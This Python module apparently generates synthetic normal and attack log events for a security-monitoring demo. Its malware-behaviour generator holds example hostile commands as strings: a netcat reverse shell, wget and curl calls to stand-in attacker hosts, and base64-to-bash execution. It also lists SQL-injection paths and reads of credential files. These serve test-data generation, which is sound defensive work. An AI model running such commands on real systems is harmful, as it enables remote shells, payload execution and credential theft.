"""
Synthetic Log Generator for ThreatLens AI live simulation and demo data.
Generates realistic normal and attack log events.
"""
import random
import re
from datetime import datetime, timezone, timedelta
from typing import List, Dict, Any


# ── Data pools ────────────────────────────────────────────────────────────────
NORMAL_USERS = ["alice", "bob", "carol", "dave", "eve", "frank", "grace", "henry"]
ADMIN_USERS = ["root", "admin", "sysadmin", "administrator"]
SERVICES = ["sshd", "apache2", "nginx", "cron", "sudo", "kernel", "systemd", "auth"]
NORMAL_PATHS = ["/index.html", "/about", "/api/v1/data", "/dashboard", "/static/app.js",
                "/images/logo.png", "/api/users", "/health", "/metrics"]
SUSPICIOUS_PATHS = ["/admin/login", "/etc/passwd", "/.env", "/wp-admin/admin.php",
                    "/phpmyadmin", "/shell.php", "/cmd.php", "/.git/config",
                    "/api/users?id=1 UNION SELECT", "/login?user=admin' OR '1'='1"]
ATTACK_IPS = ["10.0.0.66", "192.168.100.200", "45.33.32.156", "198.51.100.42",
              "203.0.113.99", "185.220.101.34", "91.108.4.100", "176.10.104.240"]
NORMAL_IPS = ["192.168.1.10", "192.168.1.25", "10.0.1.5", "10.0.1.15",
              "172.16.0.100", "192.168.2.50", "10.10.10.5"]
HTTP_METHODS = ["GET", "POST", "PUT", "DELETE"]
HTTP_CODES_NORMAL = ["200", "201", "204", "301", "302", "304"]
HTTP_CODES_ATTACK = ["400", "401", "403", "404", "500", "503"]


def _now():
    return datetime.now(timezone.utc)


# ── Normal log generators ─────────────────────────────────────────────────────
def gen_normal_login() -> Dict[str, Any]:
    user = random.choice(NORMAL_USERS)
    ip = random.choice(NORMAL_IPS)
    return {
        "timestamp": _now(),
        "source": "syslog",
        "source_ip": ip,
        "username": user,
        "event_type": "login_success",
        "message": f"Accepted password for {user} from {ip} port {random.randint(1024, 65535)} ssh2",
        "severity": "info",
        "raw_log": f"sshd: Accepted password for {user} from {ip}",
    }


def gen_normal_http() -> Dict[str, Any]:
    ip = random.choice(NORMAL_IPS)
    path = random.choice(NORMAL_PATHS)
    method = random.choice(["GET", "GET", "GET", "POST"])
    code = random.choice(HTTP_CODES_NORMAL)
    return {
        "timestamp": _now(),
        "source": "apache",
        "source_ip": ip,
        "method": method,
        "path": path,
        "status_code": code,
        "event_type": "http_request",
        "message": f"{method} {path} {code}",
        "severity": "info",
        "raw_log": f'{ip} - - [{_now().strftime("%d/%b/%Y:%H:%M:%S +0000")}] "{method} {path} HTTP/1.1" {code} 512',
    }


def gen_service_event() -> Dict[str, Any]:
    svc = random.choice(SERVICES)
    events = [
        f"Started {svc} service",
        f"Reloaded {svc} configuration",
        f"Session opened for user {random.choice(NORMAL_USERS)}",
        f"New connection from {random.choice(NORMAL_IPS)}",
    ]
    return {
        "timestamp": _now(),
        "source": "syslog",
        "source_ip": None,
        "event_type": "service_event",
        "message": random.choice(events),
        "severity": "info",
        "raw_log": f"{svc}: {random.choice(events)}",
    }


# ── Attack log generators ─────────────────────────────────────────────────────
def gen_brute_force() -> Dict[str, Any]:
    ip = random.choice(ATTACK_IPS)
    user = random.choice(ADMIN_USERS + NORMAL_USERS)
    return {
        "timestamp": _now(),
        "source": "syslog",
        "source_ip": ip,
        "username": user,
        "event_type": "auth_failure",
        "message": f"Failed password for {user} from {ip} port {random.randint(1024, 65535)} ssh2",
        "severity": "high",
        "raw_log": f"sshd: Failed password for {user} from {ip}",
    }


def gen_port_scan() -> Dict[str, Any]:
    ip = random.choice(ATTACK_IPS)
    port = random.randint(1, 65535)
    return {
        "timestamp": _now(),
        "source": "syslog",
        "source_ip": ip,
        "event_type": "port_scan",
        "message": f"SCAN attempt from {ip} to port {port} — connection refused",
        "severity": "high",
        "raw_log": f"kernel: nmap scan detected from {ip}:{port}",
    }


def gen_web_attack() -> Dict[str, Any]:
    ip = random.choice(ATTACK_IPS)
    path = random.choice(SUSPICIOUS_PATHS)
    method = random.choice(["GET", "POST"])
    code = random.choice(["400", "403", "500"])
    return {
        "timestamp": _now(),
        "source": "apache",
        "source_ip": ip,
        "method": method,
        "path": path,
        "status_code": code,
        "event_type": "suspicious_request",
        "message": f"{method} {path} [{code}] — suspicious payload detected",
        "severity": "critical",
        "raw_log": f'{ip} - - [{_now().strftime("%d/%b/%Y:%H:%M:%S +0000")}] "{method} {path} HTTP/1.1" {code} 0',
    }


def gen_privilege_escalation() -> Dict[str, Any]:
    user = random.choice(NORMAL_USERS)
    ip = random.choice(NORMAL_IPS)
    return {
        "timestamp": _now(),
        "source": "syslog",
        "source_ip": ip,
        "username": user,
        "event_type": "privilege_escalation",
        "message": f"sudo: {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND=/bin/bash",
        "severity": "critical",
        "raw_log": f"sudo: {user} ran /bin/bash as root",
    }


def gen_malware_behavior() -> Dict[str, Any]:
    ip = random.choice(ATTACK_IPS)
    processes = ["nc -e /bin/bash", "wget http://evil.example.com/payload.sh",
                 "curl http://c2server.com/beacon", "python3 -c 'import socket;exec(socket.recv())'",
                 "base64 -d <<< 'cGF5bG9hZA==' | bash"]
    return {
        "timestamp": _now(),
        "source": "syslog",
        "source_ip": ip,
        "event_type": "malware_behavior",
        "message": f"Suspicious process execution: {random.choice(processes)}",
        "severity": "critical",
        "raw_log": f"auditd: suspicious command executed from {ip}",
    }


def gen_unauthorized_access() -> Dict[str, Any]:
    ip = random.choice(ATTACK_IPS)
    path = random.choice(["/etc/shadow", "/root/.ssh/id_rsa", "/var/log/auth.log", "/etc/sudoers"])
    return {
        "timestamp": _now(),
        "source": "syslog",
        "source_ip": ip,
        "event_type": "unauthorized_access",
        "message": f"Permission denied: access to {path} from {ip}",
        "severity": "high",
        "raw_log": f"kernel: DENIED access to {path} from {ip}",
    }


# ── Batch generators ──────────────────────────────────────────────────────────
GENERATORS_NORMAL = [gen_normal_login, gen_normal_http, gen_service_event]
GENERATORS_ATTACK = [
    gen_brute_force, gen_port_scan, gen_web_attack,
    gen_privilege_escalation, gen_malware_behavior, gen_unauthorized_access,
]


def generate_log_event(attack_probability: float = 0.15) -> Dict[str, Any]:
    """Generate one random log event."""
    if random.random() < attack_probability:
        return random.choice(GENERATORS_ATTACK)()
    return random.choice(GENERATORS_NORMAL)()


def generate_demo_records(n: int = 200, attack_ratio: float = 0.15) -> List[Dict[str, Any]]:
    """Generate n log records for demo/training."""
    records = []
    for _ in range(n):
        rec = generate_log_event(attack_ratio)
        # Add missing common fields
        rec.setdefault("destination_ip", None)
        rec.setdefault("status_code", None)
        rec.setdefault("method", None)
        rec.setdefault("path", None)
        rec.setdefault("parsed_fields", None)
        rec.setdefault("dataset_id", None)
        records.append(rec)
    return records


def generate_historical_records(n: int = 1000, days_back: int = 7) -> List[Dict[str, Any]]:
    """Generate n records spread over last `days_back` days."""
    records = []
    now = _now()
    for i in range(n):
        rec = generate_log_event(0.12)
        offset_seconds = random.randint(0, days_back * 86400)
        rec["timestamp"] = now - timedelta(seconds=offset_seconds)
        rec.setdefault("destination_ip", None)
        rec.setdefault("status_code", None)
        rec.setdefault("method", None)
        rec.setdefault("path", None)
        rec.setdefault("parsed_fields", None)
        rec.setdefault("dataset_id", None)
        records.append(rec)
    return sorted(records, key=lambda r: r["timestamp"])
